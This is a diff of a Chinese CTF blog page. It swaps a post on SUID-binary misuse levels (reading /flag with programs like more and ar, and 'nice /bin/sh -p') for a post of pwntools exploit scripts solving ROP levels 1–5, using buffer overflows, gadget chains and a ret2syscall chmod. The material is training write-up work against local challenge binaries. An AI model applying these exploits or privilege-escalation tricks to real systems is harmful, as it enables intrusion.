@@ -8,7 +8,7 @@
 
 <head>
 
-  <title>ProgramMisuse | Rin</title>
+  <title>ROP | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -204,8 +204,8 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2022-03-03T03:09:26.547Z" itemprop="datePublished">
-          2022-03-03
+      <time datetime="2022-03-10T14:12:38.052Z" itemprop="datePublished">
+          2022-03-10
       </time>
     
     
@@ -214,64 +214,60 @@
     
     
 </span>
-                <h1>ProgramMisuse</h1>
+                <h1>ROP</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-ydxlqrQZ" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"
-    ></div> 
+    <div id="aplayer-QwcuwdlB" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
+
+<p>写在前面：如果是普通的环境，运行程序可能需要<code>capstone</code>，可以直接在官网下载源码编译，然后将编译好的动态链接库cp到lib里</p>
+<p><code> cp libcapstone.so.5 /lib/x86_64-linux-gnu/</code></p>
+<h4><span id="level1">Level1</span></h4><p>​        最最最基础的rop了，和前前一个module的前面的有个level一模一样。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyrop_level1.0&quot;</span>)</span><br><span class="line">win = <span class="number">0x401b56</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">104</span> + p64(win)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<p>​        关于这个module，做出题目的话大致有两个思路，一个是利用<code>/bin/sh</code>    来对整个shell提权，另外一个是利用设置了suid的特殊程序来读取flag。一般来说是第二个方法比较简单，但是有时候只有第一个方法可以行得通。</p>
-<h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h4><p>​        没有看视频，并不知道这个Misuse是什么意义，但是level1只要执行给的程序就能get flag。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.56.40.png" alt="截屏2022-01-26 下午4.56.40"></p>
-<h4 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h4><p>​        到第二题大概懂它的用意了，来补充一些知识吧。</p>
-<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.57.44.png" alt="截屏2022-01-26 下午4.57.44"></p>
-<p>​        可以看到原本我们只用普通用户权限，但是由于可执行程序将 <code>/usr/bin/more</code>    设置为了超级权限，使得这个功能能够读取到flag的内容。</p>
-<p>​        然后关于SUID，也就是Set uid ID。如果将对应位设置为S，就能够以可执行文件的owner权限执行它们。</p>
-<p>​        （SUID）仅对二进制可执行文件有效。</p>
-<p>参考：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9651622.html">Linux 特殊权限 SUID,SGID,SBIT </a>]</p>
-<h4 id="Level3-9"><a href="#Level3-9" class="headerlink" title="Level3-9"></a>Level3-9</h4><p>​        <code>xxx flag</code></p>
-<h4 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h4><p>​        指令为<code>rev</code>，所以对于获得的flag我们需要翻转一下，可以就直接用<code>rev</code>来。</p>
-<h4 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h4><p>​        控制<code>od</code>的参数，并需要简单的脚本处理字符串的空格。</p>
-<h4 id="Level12-17"><a href="#Level12-17" class="headerlink" title="Level12-17"></a>Level12-17</h4><p>​        按照给的可执行文件来。</p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-28%20%E4%B8%8B%E5%8D%886.34.25.png" alt="截屏2022-01-28 下午6.34.25"></p>
-<p>​        之前碰到这个问题的时候并咩有理解，现在算是理解了。</p>
-<h4 id="Level21"><a href="#Level21" class="headerlink" title="Level21"></a>Level21</h4><p><code>ar -r a flag</code></p>
-<p><code>cat a</code></p>
-<h4 id="Level27"><a href="#Level27" class="headerlink" title="Level27"></a>Level27</h4><p><code>nice /bin/sh -p</code></p>
-<h4 id="Level28"><a href="#Level28" class="headerlink" title="Level28"></a>Level28</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-02%20%E4%B8%8B%E5%8D%885.09.57.png" alt="截屏2022-03-02 下午5.09.57"></p>
-<h4 id="Level29"><a href="#Level29" class="headerlink" title="Level29"></a>Level29</h4><p>​        利用<code>stdbuf</code>设置输出缓冲为0，利用<code>/bin/sh</code>执行并提权。</p>
-<h4 id="Level30"><a href="#Level30" class="headerlink" title="Level30"></a>Level30</h4><p>​    </p>
-<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.38.12.png" alt="截屏2022-03-03 上午9.38.12"></p>
-<h4 id="Level34"><a href="#Level34" class="headerlink" title="Level34"></a>Level34</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.50.31.png" alt="截屏2022-03-03 上午9.50.31"></p>
-<h4 id="Level35"><a href="#Level35" class="headerlink" title="Level35"></a>Level35</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.55.21.png" alt="截屏2022-03-03 上午9.55.21"></p>
-<h4 id="Level36"><a href="#Level36" class="headerlink" title="Level36"></a>Level36</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.57.38.png" alt="截屏2022-03-03 上午9.57.38"></p>
-<h4 id="Level37"><a href="#Level37" class="headerlink" title="Level37"></a>Level37</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.00.42.png" alt="截屏2022-03-03 上午10.00.42"></p>
-<h4 id="Level38"><a href="#Level38" class="headerlink" title="Level38"></a>Level38</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.02.08.png" alt="截屏2022-03-03 上午10.02.08"></p>
-<h4 id="level39"><a href="#level39" class="headerlink" title="level39"></a>level39</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.04.09.png" alt="截屏2022-03-03 上午10.04.09"></p>
-<h4 id="Level41"><a href="#Level41" class="headerlink" title="Level41"></a>Level41<img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.17.52.png" alt="截屏2022-03-03 上午10.17.52"></h4><h4 id="Level42"><a href="#Level42" class="headerlink" title="Level42"></a>Level42</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.20.23.png" alt="截屏2022-03-03 上午10.20.23"></p>
-<h4 id="Level45"><a href="#Level45" class="headerlink" title="Level45"></a>Level45</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.52.14.png" alt="截屏2022-03-03 上午10.52.14"></p>
-<h4 id="Level47"><a href="#Level47" class="headerlink" title="Level47"></a>Level47</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.59.45.png" alt="截屏2022-03-03 上午10.59.45"></p>
-<h4 id="Level49"><a href="#Level49" class="headerlink" title="Level49"></a>Level49</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8811.05.44.png" alt="截屏2022-03-03 上午11.05.44"></p>
+<h4><span id="level2">Level2</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyrop_level2.0&quot;</span>)</span><br><span class="line">win1 = <span class="number">0x4022EE</span></span><br><span class="line">win2 = <span class="number">0x40239B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">88</span> + p64(win1) + p64(win2)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4><span id="level3">Level3</span></h4><p>​        从这个level差不多沾了一些rop的边了，需要利用<code>ROPgadget</code>来寻找对应的gadget</p>
+<p>​        </p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyrop_level3.0&quot;</span>)</span><br><span class="line">win1 = <span class="number">0x40275A</span></span><br><span class="line">win2 = <span class="number">0x402836</span></span><br><span class="line">win3 = <span class="number">0x402678</span></span><br><span class="line">win4 = <span class="number">0x402592</span></span><br><span class="line">win5 = <span class="number">0x402916</span></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x402d03</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">72</span>  </span><br><span class="line">payload += p64(rdi) + p64(<span class="number">1</span>) + p64(win1)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">2</span>) + p64(win2)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">3</span>) + p64(win3)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">4</span>) + p64(win4)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">5</span>) + p64(win5)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>​    </p>
+<h4><span id="level4">Level4</span></h4><p>​        </p>
+<p>​        rop，ret2syscall。</p>
+<p>​        这道题其实方法有很多，但是由于栈的空间相对比较小，所以官方给出的做法反而是最聪明也是最实际的。</p>
+<p>（因为如果要orw或者getshell的话似乎还要栈迁移）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">process.write(<span class="string">b&#x27;/flag\0&#x27;</span>.ljust(<span class="number">88</span>,<span class="string">b&#x27;a&#x27;</span>) + pwn.p64(pop_rax.address)+pwn.p64(<span class="number">90</span>) + pwn.p64(pop_rdi.address)+pwn.p64(<span class="built_in">input</span>) </span><br><span class="line">    ...: + pwn.p64(pop_rsi.address) + pwn.p64(<span class="number">0o777</span>) + pwn.p64(syscall.address))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我魔怔了</p>
+<p>顺便附一个拿input地址有问题的exp（其实我怀疑gadget的地址也有问题，但是懒得改了）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyrop_level4.0&quot;</span>)</span><br><span class="line">syscall = <span class="number">0x401a69</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401492</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401a91</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x401a71</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;[LEAK] Your input buffer is located at: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>  = u64(p.recv()[:<span class="number">12</span>])</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line">payload = <span class="string">b&quot;/flag\0&quot;</span>.ljust(<span class="number">88</span>,<span class="string">b&#x27;a&#x27;</span>)  </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">90</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="built_in">input</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0o777</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4><span id="level5">level5</span></h4><p>​        这个题也蛮魔怔，和上一个level没有什么区别，但是没有print input buffer，对于我来说也差不多，但是就相对更麻烦了。</p>
+<p>​</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
-    <a class="pull-left" href="../MemoryErrors/" style="float: left;">
-        ← MemoryErrors
+    <a class="pull-left" href="../../12/pwn%E4%B8%AD%E7%9A%84python%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98/" style="float: left;">
+        ← pwn中的python字符串处理问题
     </a>
     
     
-    <a class="pull-right" href="../../../02/28/Sandboxing/">
-        Sandboxing →
+    <a class="pull-right" href="../%E6%89%8B%E5%86%B2%E5%A3%B6/">
+        手冲壶 →
     </a>
     
 </nav>
